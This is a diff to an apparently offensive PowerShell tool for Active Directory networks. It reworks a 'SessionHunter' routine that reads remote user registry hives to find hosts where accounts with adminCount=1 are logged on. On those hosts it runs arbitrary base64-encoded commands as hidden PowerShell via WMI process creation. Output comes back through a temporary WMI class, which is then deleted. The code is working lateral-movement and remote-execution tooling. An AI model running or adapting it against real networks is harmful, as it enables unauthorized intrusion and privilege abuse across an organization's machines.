@@ -607,7 +607,6 @@ if ($UserDomain -ne ""){}
 # Set the variable "CurrentUser" to $True if the switch -GenRelayList is used.
 if (
     $Method -eq "GenRelayList" -or
-    $Method -eq "SessionHunter" -or
     $Method -eq "Spray" -or
     $LocalAuth
 ) {
@@ -1223,6 +1222,7 @@ $OSLength = ($computers | ForEach-Object { $_.Properties["operatingSystem"][0].L
 ################################################ Function: WMI #################################################
 ################################################################################################################
 Function Method-WMIexec {
+param ($ComputerName)
 Write-host
 
 $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
@@ -3307,98 +3307,195 @@ $runspacePool.Open()
 $runspaces = New-Object System.Collections.ArrayList
 
 $scriptBlock = {
-    param ($computerName, $Sessions)
-    
-$tcpClient = New-Object System.Net.Sockets.TcpClient
-$asyncResult = $tcpClient.BeginConnect($ComputerName, 135, $null, $null)
-$wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 
+    param ($computerName, $Command)
 
-if ($wait) { 
-    try {
-        $tcpClient.EndConnect($asyncResult)
-        $connected = $true
-    } catch {
+    $tcpClient = New-Object System.Net.Sockets.TcpClient
+    $asyncResult = $tcpClient.BeginConnect($ComputerName, 135, $null, $null)
+    $wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 
+
+    if ($wait) { 
+        try {
+            $tcpClient.EndConnect($asyncResult)
+            $connected = $true
+        } catch {
+            $connected = $false
+        }
+    } else {
         $connected = $false
     }
-} else {
-    $connected = $false
+
+    $tcpClient.Close()
+    if (!$connected) {return}
+    
+    $osInfo = $null
+    $osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue"
+    if (!$osInfo){return}
+
+
+    Function WMI {
+
+param (
+  [string]$Command = "",
+  [string]$ComputerName,
+  [string]$Class = "PMEClass"
+)
+
+
+function CreateScriptInstance([string]$ComputerName) {
+        $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2"
+        if ($classCheck -eq $null) {
+            $newClass = New-Object System.Management.ManagementClass("\\$ComputerName\root\cimv2",[string]::Empty,$null)
+            $newClass["__CLASS"] = "$Class"
+            $newClass.Qualifiers.Add("Static",$true)
+            $newClass.Properties.Add("CommandId",[System.Management.CimType]::String,$false)
+            $newClass.Properties["CommandId"].Qualifiers.Add("Key",$true)
+            $newClass.Properties.Add("CommandOutput",[System.Management.CimType]::String,$false)
+            $newClass.Put() | Out-Null
+        }
+        $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName
+        $wmiInstance.GetType() | Out-Null
+        $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
+        $wmiInstance.Dispose()
+        return $CommandId
+        
+    }
+
+function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
+    try {
+        $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "CommandId = '$CommandId'"
+        $result = $wmiInstance.CommandOutput
+        $wmiInstance.Dispose()
+        return $result
+    } 
+    catch {Write-Error $_.Exception.Message} 
+    finally {if ($wmiInstance) {$wmiInstance.Dispose()}}
 }
 
-$tcpClient.Close()
-if (!$connected) {return "Unable to connect"}
 
-Function SessionHunter {
-    param($ComputerName, $Sessions)
+    function ExecCommand([string]$ComputerName, [string]$Command) {
+        $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command
+        $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine
+        if ($process.ReturnValue -eq 0) {
+            $started = Get-Date
+            Do {
+                if ($started.AddMinutes(2) -lt (Get-Date)) {
+                    Write-Host "PID: $($process.ProcessId) - Response took too long."
+                    break
+                }
+                $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"
+                Start-Sleep -Seconds 1
+            } While ($watcher -ne $null)
+            $scriptOutput = GetScriptOutput $ComputerName $scriptCommandId
+            return $scriptOutput
+        }
+    }
 
-    $userSIDs = @()
-    $results = @()
-    $domainCache = @{} # A cache to store domain FQDNs
+    $commandString = $Command
+    $scriptCommandId = CreateScriptInstance $ComputerName
+    if ($scriptCommandId -eq $null) {
+        Write-Error "Error creating remote instance."
+    }
+    $encodedCommand = "`$result = Invoke-Command -ScriptBlock {$commandString} | Out-String; Get-WmiObject -Class $Class -Filter `"CommandId = '$scriptCommandId'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
+    $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
+    $result = ExecCommand $ComputerName $encodedCommand
+    $wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"
+    Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName | Out-Null
+    return $result
 
-    function GetDomainFQDNFromSID {
-        param($sid)
-        $objSID = New-Object System.Security.Principal.SecurityIdentifier($sid)
-        $objDomain = $objSID.Translate([System.Security.Principal.NTAccount]).Value.Split('\')[0]
-        
-        if (-not $domainCache[$objDomain]) {
-            try {
-                # Fetch the FQDN from the SID's domain part
-                $FQDN = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $objDomain))).Name
-                $domainCache[$objDomain] = $FQDN
-            } catch {
-                Write-Error "Failed to get FQDN for domain $objDomain"
-                return $objDomain
+    
+
+}
+
+    function AdminCount {
+        param (
+            [string]$UserName,
+            [System.DirectoryServices.DirectorySearcher]$Searcher
+        )
+
+        $Searcher.Filter = "(sAMAccountName=$UserName)"
+        $Searcher.PropertiesToLoad.Clear()
+        $Searcher.PropertiesToLoad.Add("adminCount") > $null
+
+        $user = $Searcher.FindOne()
+
+        if ($user -ne $null) {
+            $adminCount = $user.Properties["adminCount"]
+            if ($adminCount -eq 1) {
+                return $true
             }
         }
-        return $domainCache[$objDomain]
+        return $false
     }
 
-    try {
-        # Open the remote base key
-        $remoteRegistry = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', $ComputerName)
-    } catch {
-        return "Unable to connect"
-    }
+    function SessionHunter {
+        param($ComputerName, $Command)
 
-    # Get the subkeys under HKEY_USERS
-    $userKeys = $remoteRegistry.GetSubKeyNames()
+        $userSIDs = @()
+        $domainCache = @{}
+        $Searcher = New-Object System.DirectoryServices.DirectorySearcher
+        $adminPresent = $false
 
-    foreach ($key in $userKeys) {
-        # Skip common keys that are not user SIDs
-        if ($key -match '^[Ss]-\d-\d+-(\d+-){1,14}\d+$') {
-            $userSIDs += $key
+        function GetDomainFQDNFromSID {
+            param($sid)
+            $objSID = New-Object System.Security.Principal.SecurityIdentifier($sid)
+            $objDomain = $objSID.Translate([System.Security.Principal.NTAccount]).Value.Split('\')[0]
+            
+            if (-not $domainCache[$objDomain]) {
+                try {
+                    $FQDN = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $objDomain))).Name
+                    $domainCache[$objDomain] = $FQDN
+                } catch {
+                    return $objDomain
+                }
+            }
+            return $domainCache[$objDomain]
         }
-    }
 
-    # Close the remote registry key
-    $remoteRegistry.Close()
-
-    # Resolve the SIDs to usernames
-    foreach ($sid in $userSIDs) {
         try {
-            $user = New-Object System.Security.Principal.SecurityIdentifier($sid)
-            $userTranslation = $user.Translate([System.Security.Principal.NTAccount])
-
-            # Get the domain part from the SID
-            $actualFQDN = GetDomainFQDNFromSID $sid
-            $results += "$actualFQDN\$($userTranslation.Value.Split('\')[1])"
-
-        } catch {}
-    }
-
-    if ($results.Count -gt 0) {
-        foreach ($SessionUser in $results) {
-            Write-Output ("- $SessionUser")
+            $remoteRegistry = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', $ComputerName)
+        } catch {
+            return
         }
-        
-    } else {
-        return "No Active Sessions"
+
+        $userKeys = $remoteRegistry.GetSubKeyNames()
+
+        foreach ($key in $userKeys) {
+            if ($key -match '^[Ss]-\d-\d+-(\d+-){1,14}\d+$') {
+                $userSIDs += $key
+            }
+        }
+
+        $remoteRegistry.Close()
+
+        foreach ($sid in $userSIDs) {
+            try {
+                $user = New-Object System.Security.Principal.SecurityIdentifier($sid)
+                $userTranslation = $user.Translate([System.Security.Principal.NTAccount])
+                $username = $userTranslation.Value.Split('\')[1]
+                
+                if (AdminCount -UserName $username -Searcher $Searcher) {
+                    $adminPresent = $true
+                    break
+                }
+            } catch {}
+        }
+
+        if ($adminPresent) {
+            if ($Command -eq ""){
+            # We can just return as OSinfo was checked earlier in script
+            return "Successful connection PME"
+            
+            }
+            elseif ($Command -ne ""){
+
+            return WMI $ComputerName -command $Command
+            
+            }
+        }
+
     }
-}
 
-
-
-SessionHunter -ComputerName $computerName
-
+   SessionHunter -ComputerName $computerName -command $Command
 
 }
 
@@ -3448,7 +3545,7 @@ foreach ($computer in $computers) {
     $ComputerName = $computer.Properties["dnshostname"][0]
     $OS = $computer.Properties["operatingSystem"][0]
     
-    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Sessions)
+    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command)
     $runspace.RunspacePool = $runspacePool
 
     [void]$runspaces.Add([PSCustomObject]@{
@@ -3467,125 +3564,36 @@ do {
             $runspace.Completed = $true
             $result = $runspace.Runspace.EndInvoke($runspace.Handle)
 
-            if ($result -match "Unable to connect"){continue}
-            
-            if ($result -eq "No Active Sessions") {
-                if ($SuccessOnly) {continue}
-                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "No Active Sessions" -NameLength $NameLength -OSLength $OSLength
-            } elseif ($result) {
+            if ($result -match "Unable to connect") { continue }
 
-            $GroupMatch = $False
-            
+            if ($result -eq "Successful Connection PME") {
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+                continue
+            }
 
-                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
-                $result | Out-File  -FilePath "$Sessions\$($runspace.ComputerName)-Sessions.txt" -Encoding "ASCII"
-                Write-Output ""
-
-                $maxLength = ($result | Measure-Object -Property Length -Maximum).Maximum
-
-                # Hashtable to hold user-role associations
-                $userRoles = @{}
-
-                foreach ($line in $result) {
-                    # If the line is not yet in the hashtable, add it
-                    if (-not $userRoles.ContainsKey($line)) {
-                        $userRoles[$line] = @()
+            if ($result) {
+                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
+                
+                if ($Module -ne "") {
+                    if ($ShowOutput) { 
+                        $result | Write-Host 
                     }
-
-                    # Check for Domain Admins
-                    foreach ($DA in $FQDNDomainPlusDomainAdmins) {
-                        if ($line -match [regex]::Escape($DA)) {
-                            $userRoles[$line] += "[DA]"
-
-                    if (!$GroupMatch) {
-                        $runspace.ComputerName | Out-File -Append -FilePath "$Sessions\.SH-MatchedGroups-$Domain.txt" -Encoding "ASCII"
-                        $GroupMatch = $true
-                    }
-
-                            break
-                        }
-                    }
-
-                    # Check for Enterprise Admins
-                    foreach ($EA in $FQDNDomainPlusEnterpriseAdmins) {
-                        if ($line -match [regex]::Escape($EA)) {
-                            $userRoles[$line] += "[EA]"
-
-                    if (!$GroupMatch) {
-                        $runspace.ComputerName | Out-File -Append -FilePath "$Sessions\.SH-MatchedGroups-$Domain.txt" -Encoding "ASCII"
-                        $GroupMatch = $true
-                    }
-
-                            break
-                        }
-                    }
-
-                    # Check for Server Operators
-                    foreach ($SO in $FQDNDomainPlusServerOperators) {
-                        if ($line -match [regex]::Escape($SO)) {
-                            $userRoles[$line] += "[Server Operator]"
-
-                    if (!$GroupMatch) {
-                        $runspace.ComputerName | Out-File -Append -FilePath "$Sessions\.SH-MatchedGroups-$Domain.txt" -Encoding "ASCII"
-                        $GroupMatch = $true
-                    }
-
-                            break
-                        }
-                    }
-
-                    # Check for Account Operators
-                    foreach ($AO in $FQDNDomainPlusAccountOperators) {
-                        if ($line -match [regex]::Escape($AO)) {
-                            $userRoles[$line] += "[Account Operator]"
-
-                    if (!$GroupMatch) {
-                        $runspace.ComputerName | Out-File -Append -FilePath "$Sessions\.SH-MatchedGroups-$Domain.txt" -Encoding "ASCII"
-                        $GroupMatch = $true
-                    }
-
-                            break
-                        }
-                    }
+                } elseif ($Module -eq "") {
+                    $result | Write-Host
                 }
-
-                # Print the results with proper alignment
-                foreach ($key in $userRoles.Keys) {
-                    $formattedUser = "{0,-$maxLength}" -f $key
-                    Write-Host $formattedUser -NoNewline -ForegroundColor White
-
-                    if ($userRoles[$key].Count -gt 0) {
-                        Write-Host ("   " + ($userRoles[$key] -join " ")) -ForegroundColor Yellow
-                    } else {
-                        Write-Output ""
-                    }
-                }
-
-                Write-Output ""
             }
         }
-        
-        $content = Get-Content -Path "$Sessions\.SH-MatchedGroups-$Domain.txt" -ErrorAction "SilentlyContinue" | Get-Unique
-        $content | Set-Content -Path "$Sessions\.SH-MatchedGroups-$Domain.txt" -Force -ErrorAction "SilentlyContinue"
-
     }
+
     Start-Sleep -Milliseconds 100
 } while ($runspaces | Where-Object { -not $_.Completed })
+
 
 
 # Clean up
 $runspacePool.Close()
 $runspacePool.Dispose()
 
-Write-Host
-Write-Host
-Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
-Write-Host "Group Membership Legend"
-Write-Host
-    Write-Host "- [DA] = Domain Admin"
-    Write-Host "- [EA] = Enterprise Admin"
-    Write-Host "- [AO] = Account Operator"
-    Write-Host "- [SO] = Server Operator"
 
 }
 
